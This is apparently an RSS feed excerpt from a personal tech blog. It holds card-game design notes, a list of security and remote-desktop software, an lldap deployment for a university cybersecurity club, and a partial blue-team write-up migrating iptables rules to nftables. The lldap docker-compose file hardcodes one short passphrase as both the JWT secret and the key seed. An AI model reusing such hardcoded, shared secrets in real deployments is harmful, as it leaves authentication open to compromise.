<section id="combat" class="level1">
<h1>Combat</h1>
<p>Defensive player sets up layout at the end of their attacking turn, and cannot change it or reoganize it.</p>
<p>Attack player sets a layout, and then either chooses to make the first move, or to pick how the connections work.</p>
<p>Played on something equivalent to a hex grid, but not an actual hex grid. A square grid where each row is offset by ½, and touching squares are considered connected.</p>
<p>Moves cards can make:</p>
<p>Move: Move onto an adjacent card.</p>
<p>Swap: Replace adjacent card with this one</p>
<p>Pull: Pull connected card under this card.</p>
<ul>
<li>Pull into spot, and move this card out of the way?</li>
</ul>
<p>Push: Move card out of way? Maybe can push in place to move a card to an adjacent spot</p>
<p>Spawn: Spawn new piece in a blank spot adjacent to your own pieces, and only your own pieces</p>
<p>All of these moves can be done over a chain of your color’s cards, including attacking/defending ones.</p>
<p>Stacked cards are considered as attacking eachother, and cannot move on/off, but they can be moved over.</p>
<p>The attacker round ends immediately when a player stalemates is unable to make a swap, push, or pull move. ???</p>
<p>One hive rule (from hive): Players cannot make a move that results in their being two groups of cards.</p>
<p><a href="https://en.wikipedia.org/wiki/Hive_(game)" class="uri">https://en.wikipedia.org/wiki/Hive_(game)</a></p>
<p>So… how does a player actually do damage? And how should collective defense/attack and multi attack/defense work?</p>
<p>Two ways I am thinking of doing damage: Getting a card onto/past all defenders</p>
<p>Or creating a chain that connects it past defenders. Maybe like 1 damage for each card in the chain?</p>
<p>How should cards launch an attack against valuable cards? Surrounding them? Building a chain which accesses them?</p>
<p>Ideas:</p>
<ul>
<li>Attackers cards deal (ATK + ATK + ATK) *N where N in the amount of cards surrounding a card, but those cards of that set can’t attack a player</li>
<li>Defenders cards can protect (DEF* )</li>
<li>Surrounding a card with 6 cards is an insta kill (can be on top cards as well)</li>
<li>This is in <em>addition</em> to the mechanic where cards on top of eachother battle.</li>
</ul>
<p>Idea: replace mtg banding</p>
<p>Should cards being on top or below matter? Maybe? Only on top cards count for purposes of a chain, and also can surround other cards.</p>
<p>Anyway, this is good, but I need to calculate the fairness of this game. I think the only way to calculate fairness is to write a program that solves this game.</p>
<p>Combat ends <strong>immediately</strong> where a player cannot make another move (either attacker or defender).</p>
<p>What about drawish rules, like 3 fold repetition?</p>
<section id="combat-phase" class="level2">
<h2 class="anchored" data-anchor-id="combat-phase">Combat Phase</h2>
<p>It goes step by step. Steps go like</p>
<ul>
<li><p>Offensive player moves cards, or plays cards into the combat zone. This one can only be done once.</p></li>
<li><p>Offensive player activates an “instead of draw trigger” Only done once, and mutually exclusive with the above.</p></li>
<li><p>Defensive player makes a move, or plays a card into the combat zone.</p></li>
<li><p>End step</p></li>
</ul>
<p>Or maybe vice versa?</p>
<p>Regardless, cards only die at the end of each “step”, giving either player time to do things like counterspell and react with spell type abilities.</p>
<p>Infinite Loop Prevention: A trigger can only be triggered once per combat step (for both players).</p>
</section>
<section id="programming-this" class="level2">
<h2 class="anchored" data-anchor-id="programming-this">Programming This</h2>
<p>I think I need to convert this to a python program that will solve any set of rules I give it, in order to actually ensure my game is fair., I’ve done some testing on my own, but I don’t think just one person can play chess.</p>
<ul>
<li><a href="https://stackoverflow.com/questions/11373122/best-way-to-store-a-triangular-hexagonal-grid-in-python">Hexagonal Grid in python (stackoverflow)</a></li>
<li><a href="http://www-cs-students.stanford.edu/~amitp/game-programming/grids/">Grids</a></li>
<li><a href="https://www.redblobgames.com/grids/hexagons/">Grids/hexagons</a></li>
<li><a href="https://www.redblobgames.com/grids/parts/">Grids/parts</a></li>
</ul>
<p>So… how can I make a hexagonal grid in order to calculate solutions to my game?</p>
<p>I really, really like the idea of representing <a href="https://www.redblobgames.com/grids/hexagons/#coordinates-cube">hexagonal coordinates as a cube</a>.</p>
<p>Pseudocode of what I want:</p>
<pre><code>HexGrid = 2d array, or graph of nodes

CheckLegality: Function that checks if a hex grid config is legal (all nodes are connected)

GetMovesJump: Get Possible moves of the Jump on top of another card type

GetMovesShove: Get possible moves of the shove card out of the way type

GetMovesPull: Get possible moves of the pull card under type

GetMovesSwap: Get possible moves of the swap type

GetWin: Get the amount of damage a winning attacker would do</code></pre>
<p>I would also need several other functions/features, like I would have to be able to detect if a set of moves is the same as an older set of moves. I think this is easier with a set of nodes than an infinitely large hex grid.</p>
<p>People at the San Fernando Valley LUG, said I should research “graph theory”, because there already exist algorithms to check if all nodes are connected, or to traverse a graph, or so on.</p>


</section>
</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/cardgame/</guid>
  <pubDate>Thu, 12 Sep 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Software Projects I follow</title>
  <link>./blog/watched-software/</link>
  <description><![CDATA[ 




<section id="vulnerability-scanning-greenbone" class="level1">
<h1>Vulnerability Scanning (Greenbone)</h1>
<p>External:</p>
<p>(<a href="https://programming.dev/post/17335421" class="uri">https://programming.dev/post/17335421</a>)</p>
<ul>
<li><p><a href="https://github.com/future-architect/vuls" class="uri">https://github.com/future-architect/vuls</a> <a href="https://h0bbl3s.port0.org/vulnerability-scanning-with-vuls/" class="uri">https://h0bbl3s.port0.org/vulnerability-scanning-with-vuls/</a></p></li>
<li><p><a href="https://github.com/vulsio/vulsctl" class="uri">https://github.com/vulsio/vulsctl</a></p></li>
<li><p><a href="https://github.com/projectdiscovery/nuclei" class="uri">https://github.com/projectdiscovery/nuclei</a></p></li>
<li><p><a href="https://doc.ivre.rocks/en/latest/" class="uri">https://doc.ivre.rocks/en/latest/</a></p></li>
<li><p><a href="https://github.com/tlkh/prowler" class="uri">https://github.com/tlkh/prowler</a> — last update 6 years ago</p></li>
<li><p>Nmap scripts</p>
<ul>
<li><a href="https://github.com/scipag/vulscan" class="uri">https://github.com/scipag/vulscan</a> — vulnerability scanning project for nmap</li>
<li><a href="https://github.com/vulnersCom/nmap-vulners" class="uri">https://github.com/vulnersCom/nmap-vulners</a></li>
<li><a href="https://github.com/cloudflare/flan" class="uri">https://github.com/cloudflare/flan</a> — last update 2 years ago, based on vulners fro nmap</li>
</ul></li>
</ul>
<p>Web scanning:</p>
<ul>
<li><a href="https://www.zaproxy.org/" class="uri">https://www.zaproxy.org/</a></li>
</ul>
</section>
<section id="browser-based-desktop-kasmwebvnc" class="level1">
<h1>Browser based Desktop (Kasmweb/VNC)</h1>
<p>Full featured:</p>
<p>Multi user Full Featured:</p>
<ul>
<li><a href="https://games-on-whales.github.io/" class="uri">https://games-on-whales.github.io/</a> — <a href="https://github.com/games-on-whales" class="uri">https://github.com/games-on-whales</a></li>
<li><a href="https://github.com/spaceness/stardust" class="uri">https://github.com/spaceness/stardust</a></li>
<li>kasmweb — not open source</li>
<li><a href="https://github.com/pwncollege/dojo" class="uri">https://github.com/pwncollege/dojo</a>
<ul>
<li>Is an addon to <a href="https://docs.ctfd.io/docs/overview/" class="uri">https://docs.ctfd.io/docs/overview/</a>, but adds web workspaces and more.</li>
<li><a href="https://docs.ctfd.io/docs/settings/single-sign-on/#oauth">ctfd has SSO support</a></li>
</ul></li>
<li><a href="https://coder.com/" class="uri">https://coder.com/</a>
<ul>
<li>Open source, self hostable</li>
</ul></li>
<li><a href="https://github.com/opencloudplay" class="uri">https://github.com/opencloudplay</a></li>
<li>FastX — offers student discounts, according to the person at the booth at the So Cal Linux Expo.</li>
<li><a href="https://github.com/giongto35/cloud-morph" class="uri">https://github.com/giongto35/cloud-morph</a></li>
</ul>
<p>Single User full featured:</p>
<ul>
<li><a href="https://docs.linuxserver.io/images/docker-kasm/" class="uri">https://docs.linuxserver.io/images/docker-kasm/</a></li>
<li><a href="https://github.com/Fmstrat/webbian" class="uri">https://github.com/Fmstrat/webbian</a> — <a href="https://nowsci.com/webbian/">Docs</a></li>
<li><a href="https://github.com/m1k1o/neko" class="uri">https://github.com/m1k1o/neko</a>
<ul>
<li>Notable because this one supports password auth, and viewer/controller style setups. It’s explicitly designed for multi-user web browsing activities.</li>
</ul></li>
<li><a href="https://github.com/accetto/ubuntu-vnc-xfce-g3" class="uri">https://github.com/accetto/ubuntu-vnc-xfce-g3</a></li>
<li><a href="https://github.com/gezp/docker-ubuntu-desktop" class="uri">https://github.com/gezp/docker-ubuntu-desktop</a></li>
<li><a href="https://github.com/selkies-project/docker-nvidia-egl-desktop" class="uri">https://github.com/selkies-project/docker-nvidia-egl-desktop</a>
<ul>
<li>Also has nvidia-glx-desktop</li>
<li>Although the docker containers seem to be maintained, the overall product seems to be dead. It looks like they were working towards a full web UI before it died.</li>
</ul></li>
<li><a href="https://github.com/vital987/vubuntu" class="uri">https://github.com/vital987/vubuntu</a> — last updated 2 years ago</li>
</ul>
<p>Web apps:</p>
<ul>
<li><a href="https://github.com/DustinBrett/daedalOS" class="uri">https://github.com/DustinBrett/daedalOS</a></li>
<li><a href="https://docs.fullstacked.org/#/" class="uri">https://docs.fullstacked.org/#/</a></li>
<li><a href="https://github.com/MercuryWorkshop/anuraOS" class="uri">https://github.com/MercuryWorkshop/anuraOS</a>
<ul>
<li>This one is special because it uses a javascript linux emulator combined with a proxy, to have a full linux environment running in your browser.</li>
</ul></li>
<li><a href="https://copy.sh/v86/" class="uri">https://copy.sh/v86/</a>
<ul>
<li>No networking</li>
</ul></li>
<li><a href="https://bellard.org/jslinux/" class="uri">https://bellard.org/jslinux/</a> — linux emulator</li>
<li><a href="https://github.com/shmuelhizmi/web-desktop-environment" class="uri">https://github.com/shmuelhizmi/web-desktop-environment</a> — web app, but has xpra support</li>
</ul>
<p>Somewhat related: <a href="https://github.com/udevbe/greenfield" class="uri">https://github.com/udevbe/greenfield</a> — it’s an html5 wayland compositor.</p>
<p>Also related: <a href="https://github.com/giongto35/cloud-morph">cloud-morph</a> and <a href="https://github.com/giongto35/cloud-game">cloud-game</a></p>
</section>
<section id="intrustion-detection-system-wazuh" class="level1">
<h1>Intrustion Detection System (Wazuh)</h1>
<ul>
<li>Wazuh</li>
<li><a href="https://www.la-samhna.de/samhain/">Samhain</a></li>
<li><a href="https://www.nongnu.org/tiger/">Tiger</a></li>
<li><a href="https://en.wikipedia.org/wiki/Open_Source_Tripwire">Tripwire</a> (last update 6 years ago)</li>
<li><a href="https://github.com/falcosecurity/falco">Falco</a></li>
</ul>
</section>
<section id="domainad" class="level1">
<h1>Domain/AD</h1>
<ul>
<li><a href="https://cid-doc.github.io/" class="uri">https://cid-doc.github.io/</a></li>
</ul>
</section>
<section id="cicd-security" class="level1">
<h1>CI/CD Security</h1>
<p>There was an interesting project, but I don’t remember it’s name.</p>
</section>
<section id="staticrypt" class="level1">
<h1>Staticrypt:</h1>
<p>Software that encrypts contents of a static site, to be unlocked by a password. Staticrypt was were I first saw this idea.</p>
<ul>
<li><a href="https://github.com/robinmoisson/staticrypt">Staticrypt</a></li>
<li><a href="https://github.com/mprimi/portable-secret" class="uri">https://github.com/mprimi/portable-secret</a></li>
<li><a href="https://github.com/sowbug/quaid" class="uri">https://github.com/sowbug/quaid</a></li>
</ul>
<p><a href="https://news.ycombinator.com/item?id=41404064">Hacker News Discussion</a></p>
<p><a href="https://programming.dev/post/18818724">Lemmy Discussion</a></p>
<p>Lots of similar software mentioned there.</p>
</section>
<section id="ai" class="level1">
<h1>AI</h1>
<section id="speech-to-text-and-text-to-speech" class="level2">
<h2 class="anchored" data-anchor-id="speech-to-text-and-text-to-speech">Speech-To-Text and Text-To-Speech</h2>
<ul>
<li><a href="https://github.com/k2-fsa/sherpa-onnx" class="uri">https://github.com/k2-fsa/sherpa-onnx</a></li>
<li></li>
</ul>
</section>
<section id="llms" class="level2">
<h2 class="anchored" data-anchor-id="llms">LLM’s</h2>
<ul>
<li><a href="https://github.com/Mozilla-Ocho/llamafile" class="uri">https://github.com/Mozilla-Ocho/llamafile</a></li>
</ul>
</section>
</section>
<section id="misc" class="level1">
<h1>Misc:</h1>
<ul>
<li><a href="https://github.com/jvoisin/php-malware-finder" class="uri">https://github.com/jvoisin/php-malware-finder</a> — Uses yara rules to find PHP webshells and other malware.</li>
<li><a href="https://github.com/lakinduakash/linux-wifi-hotspot" class="uri">https://github.com/lakinduakash/linux-wifi-hotspot</a></li>
<li><a href="https://github.com/pieroproietti/penguins-eggs" class="uri">https://github.com/pieroproietti/penguins-eggs</a> — create custom arch isos</li>
<li><a href="https://github.com/sickcodes/Docker-OSX" class="uri">https://github.com/sickcodes/Docker-OSX</a></li>
<li><a href="https://github.com/wavemakercards/wavemaker-cards-v4" class="uri">https://github.com/wavemakercards/wavemaker-cards-v4</a></li>
<li><a href="https://github.com/Kron4ek/Conty" class="uri">https://github.com/Kron4ek/Conty</a></li>
<li><a href="https://github.com/jordansissel/fpm" class="uri">https://github.com/jordansissel/fpm</a> — Can convert packages from one type to another.</li>
<li><a href="https://github.com/Fmstrat/winapps" class="uri">https://github.com/Fmstrat/winapps</a> and <a href="https://github.com/Fmstrat/loffice-365" class="uri">https://github.com/Fmstrat/loffice-365</a></li>
</ul>
</section>
<section id="funny" class="level1">
<h1>Funny</h1>
<ul>
<li><a href="https://github.com/Daniel-Liu-c0deb0t/uwu" class="uri">https://github.com/Daniel-Liu-c0deb0t/uwu</a></li>
<li><a href="https://github.com/sudofox/shell-mommy" class="uri">https://github.com/sudofox/shell-mommy</a></li>
</ul>


</section>

 ]]></description>
  <category>blog</category>
  <guid>./blog/watched-software/</guid>
  <pubDate>Sat, 07 Sep 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Connecting Linux machines to Active Directory</title>
  <link>./playground/ad-linux/</link>
  <description><![CDATA[ 




<section id="research" class="level1">
<h1>Research</h1>
<p>This is part of a project for CSUN’s Layer 8 cybersecurity club.</p>
<p>There seem to be multiple ways of connecting a Linux machine to an LDAP server, in such a way that users can login using LDAP credentials.</p>
<ul>
<li><a href="https://arthurdejong.org/nss-pam-ldapd/setup">nss-pam</a></li>
<li><a href="https://www.redhat.com/sysadmin/linux-active-directory">realmd/sssd</a></li>
<li><a href="https://wiki.debian.org/AuthenticatingLinuxWithActiveDirectory">Windbind/Samba</a> (last updated 2016)</li>
</ul>
<p>Package comparison Table (Repology):</p>
<ul>
<li><a href="https://repology.org/project/nss-pam-ldapd/versions">nss-pam-ldapd</a></li>
<li><a href="https://repology.org/project/realmd/versions">realmd</a></li>
<li><a href="https://repology.org/project/sssd/versions">sssd</a> — Not on Arch</li>
<li><a href="https://repology.org/project/samba/versions">samba</a></li>
<li><a href="https://repology.org/project/krb5/versions">krb5</a></li>
<li><a href="https://repology.org/project/apmod:auth-ntlm-winbind/versions">winbind</a> — only thing I could find, and not packaged everywhere</li>
</ul>
<p>Looking at this, nss-pam-ldapd seems to be the most generally available option for systems. Although, pam is only portable to systems that have it, all of our systems have pam, except for one — the openbsd system.</p>
</section>
<section id="deploying-lldap" class="level1">
<h1>Deploying lldap</h1>
<p>Windows team didn’t give us access to their active directory server, so we decided to deploy ldap instead. For deploying lldap, I chose <a href="https://github.com/lldap/lldap">lldap</a>, an all in one ldap implementation, that comes with a web ui for managemnt.</p>
<p>Here is the docker-compose.yml I am using:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>docker-compose.yml</strong></pre>
</div>
<div class="sourceCode" id="cb1" data-filename="docker-compose.yml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb1-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">version</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"3"</span></span>
<span id="cb1-2"></span>
<span id="cb1-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">volumes</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">lldap_data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">driver</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> local</span></span>
<span id="cb1-6"></span>
<span id="cb1-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">services</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">lldap</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">image</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> docker.io/lldap/lldap:stable</span></span>
<span id="cb1-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ports</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-11"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # For LDAP, not recommended to expose, see Usage section.</span></span>
<span id="cb1-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"3890:3890"</span></span>
<span id="cb1-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # For LDAPS (LDAP Over SSL), enable port if LLDAP_LDAPS_OPTIONS__ENABLED set true, look env below</span></span>
<span id="cb1-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6360:6360"</span></span>
<span id="cb1-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # For the web front-end</span></span>
<span id="cb1-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"17170:17170"</span></span>
<span id="cb1-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">volumes</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-18"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">     # - "lldap_data:/data"</span></span>
<span id="cb1-19"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # Alternatively, you can mount a local folder</span></span>
<span id="cb1-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">       </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"./lldap_data:/data"</span></span>
<span id="cb1-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">environment</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb1-22"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      #- UID=####</span></span>
<span id="cb1-23"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      #- GID=####</span></span>
<span id="cb1-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      #- TZ=####/####</span></span>
<span id="cb1-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> LLDAP_JWT_SECRET="uprising slacks snuggle"</span></span>
<span id="cb1-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> LLDAP_KEY_SEED="uprising slacks snuggle"</span></span>
<span id="cb1-27"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> LLDAP_LDAP_BASE_DN=dc=example,dc=com</span></span>
<span id="cb1-28"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # If using LDAPS, set enabled true and configure cert and key path</span></span>
<span id="cb1-29"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # - LLDAP_LDAPS_OPTIONS__ENABLED=true</span></span>
<span id="cb1-30"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # - LLDAP_LDAPS_OPTIONS__CERT_FILE=/path/to/certfile.crt</span></span>
<span id="cb1-31"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # - LLDAP_LDAPS_OPTIONS__KEY_FILE=/path/to/keyfile.key        </span></span>
<span id="cb1-32"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # You can also set a different database:</span></span>
<span id="cb1-33"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # - LLDAP_DATABASE_URL=mysql://mysql-user:password@mysql-server/my-database</span></span>
<span id="cb1-34"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # - LLDAP_DATABASE_URL=postgres://postgres-user:password@postgres-server/my-database</span></span></code></pre></div>
</div>
<p>And then I copied the <code>lldap_config.docker_template.toml</code> to <code>./dat a/lldap_config.toml</code>. This sets up the default config for lldap.</p>
<p>From here, the LDAP configuration can be edited through the web ui accessible at http://<you-ip>:17170</you-ip></p>
</section>
<section id="connecting-to-ldap" class="level1">
<h1>Connecting to LDAP</h1>
<section id="archlinux" class="level2">
<h2 class="anchored" data-anchor-id="archlinux">Archlinux</h2>
<p><code>sudo pacman -Syu nss-pam-ldapd</code></p>
</section>
<section id="kalidebian" class="level2">
<h2 class="anchored" data-anchor-id="kalidebian">Kali/Debian</h2>
<p><code>apt update</code></p>
<p><code>apt install libnss-ldapd nslcd</code> (Do I need libpam-ldapd?)</p>
</section>
<section id="openbsd" class="level2">
<h2 class="anchored" data-anchor-id="openbsd">Openbsd</h2>
<p>???</p>
</section>
<section id="rhel" class="level2">
<h2 class="anchored" data-anchor-id="rhel">RHEL</h2>
<p><code>dnf update</code></p>
<p><code>dnf install realmd sssd</code> (RHEL clones don’t seem to have nss-pam-ldapd)</p>


</section>
</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/ad-linux/</guid>
  <pubDate>Thu, 29 Aug 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Nice Challenge 6</title>
  <dc:creator>Jeffrey Fonseca</dc:creator>
  <link>./writeups/nice-challenge-6/</link>
  <description><![CDATA[ 




<p>This is for the <a href="https://nice-challenge.com/">NICE</a> challenge. It’s a blue team challenge where you are tasked with hardening machines. Perhaps there is more, but all I was asked to do for this challenge was some simple hardening.</p>
<p>The name of this specific challenge was “CCDC Training 1 - Firewall Updates at Pretty Safe Electronics Corp.”. The point of this challenge was to convert multiple older Linux machines from iptables to nftables.</p>
<p>Like previous Nice challenges, this challenge also began with a simulated chatroom, where we the situation was explained.</p>
<p><img src="./writeups/nice-challenge-6/images/chatroom.png" class="img-fluid"></p>
<p>Here are the empty checks:</p>
<p><img src="./writeups/nice-challenge-6/images/emptychecks.jpeg" class="img-fluid"></p>
<section id="fileshare" class="level1">
<h1>Fileshare</h1>
<section id="nftables-migration" class="level2">
<h2 class="anchored" data-anchor-id="nftables-migration">Nftables Migration</h2>
<div class="callout callout-style-default callout-tip callout-titled">
<div class="callout-header d-flex align-content-center">
<div class="callout-icon-container">
<i class="callout-icon"></i>
</div>
<div class="callout-title-container flex-fill">
Tip
</div>
</div>
<div class="callout-body-container callout-body">
<p>Use the <code>pastebinit</code> command, provided by the <code>pastebinit</code> package to easily upload files to pastebins, online sites dedicated to sharing short bits of text.</p>
<p><code>command | pastebin -b paste.debian.net</code> uploads to &lt;paste.debian.net&gt;, or use the <code>-i</code> argument to upload a specific file.</p>
</div>
</div>
<p>In the home directory, there is a file that contains the iptables rules:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>fs_iptables_v4</strong></pre>
</div>
<div class="sourceCode" id="cb1" data-filename="fs_iptables_v4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1"># Generated by iptables-save v1.6.0 on Thu Jan 17 04:11:15 2019</span>
<span id="cb1-2">*filter</span>
<span id="cb1-3">:INPUT DROP [0:0]</span>
<span id="cb1-4">:FORWARD ACCEPT [0:0]</span>
<span id="cb1-5">:OUTPUT ACCEPT [41:8202]</span>
<span id="cb1-6">-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span>
<span id="cb1-7">-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</span>
<span id="cb1-8">-A INPUT -p tcp -m tcp --dport 139 -j ACCEPT</span>
<span id="cb1-9">-A INPUT -p tcp -m tcp --dport 445 -j ACCEPT</span>
<span id="cb1-10">COMMIT</span>
<span id="cb1-11"># Completed on Thu Jan 17 04:11:15 2019</span></code></pre></div>
</div>
<p>Except… not quite. When using iptables -L or iptables-save to look at the rules, they give different results than the saved file, a few less:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">Chain INPUT (policy DROP)</span>
<span id="cb2-2">target     prot opt source               destination         </span>
<span id="cb2-3">ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED</span>
<span id="cb2-4">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh</span>
<span id="cb2-5">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:microsoft-ds</span>
<span id="cb2-6"></span>
<span id="cb2-7">Chain FORWARD (policy ACCEPT)</span>
<span id="cb2-8">target     prot opt source               destination         </span>
<span id="cb2-9"></span>
<span id="cb2-10">Chain OUTPUT (policy ACCEPT)</span>
<span id="cb2-11">target     prot opt source               destination         </span></code></pre></div>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>iptables-save</strong></pre>
</div>
<div class="sourceCode" id="cb3" data-filename="iptables-save" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1"># Generated by iptables-save v1.6.0 on Mon Aug 26 01:26:17 2024</span>
<span id="cb3-2">*filter</span>
<span id="cb3-3">:INPUT DROP [31:3283]</span>
<span id="cb3-4">:FORWARD ACCEPT [0:0]</span>
<span id="cb3-5">:OUTPUT ACCEPT [2070:673014]</span>
<span id="cb3-6">-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span>
<span id="cb3-7">-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</span>
<span id="cb3-8">-A INPUT -p tcp -m tcp --dport 445 -j ACCEPT</span>
<span id="cb3-9">COMMIT</span>
<span id="cb3-10"># Completed on Mon Aug 26 01:26:17 2024</span></code></pre></div>
</div>
<p>Because the file in the home directory has extra iptables configuration, I will use those configurations instead. Despite being the output of <code>iptable-save</code>, I can use the <code>iptables-nftables-compat</code> package, which provides and <code>iptables</code> and <code>iptables-save</code> command that actually manipulate <code>nftables</code>.</p>
<p>So, because only the <code>INPUT</code> chain has rules, and none of the other chains have any rules (including <code>mangle</code> or <code>nat</code>), we only need to flush those rules:</p>
<p><code>iptables -F INPUT</code></p>
<p>The other thing that needs to be done is to change the iptables <code>INPUT</code> table to from teh default <code>DROP</code> policy to an <code>ACCEPT</code> policy.</p>
<p><code>iptables -P INPUT ACCEPT</code></p>
<p>after this, iptables is clear of rules:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">Chain INPUT (policy ACCEPT)</span>
<span id="cb4-2">target     prot opt source               destination         </span>
<span id="cb4-3"></span>
<span id="cb4-4">Chain FORWARD (policy ACCEPT)</span>
<span id="cb4-5">target     prot opt source               destination         </span>
<span id="cb4-6"></span>
<span id="cb4-7">Chain OUTPUT (policy ACCEPT)</span>
<span id="cb4-8">target     prot opt source               destination</span></code></pre></div>
<p>Now, with the iptables chains set to the default, and the ruleset saved, we can comfortable switch to nftables. The <code>iptables-compat</code> set of commands, provided by the <code>iptables-nftables-compat</code> package, lets us restore the ruleset to nft from the firewall:</p>
<p><code>iptables-compat-restore fs_tables_v4</code> ­— this passes the “Fileshare filtering traffic correctly check.</p>
<p><code>systemctl enable nftables</code></p>
<p><code>systemctl start nftables.service</code></p>
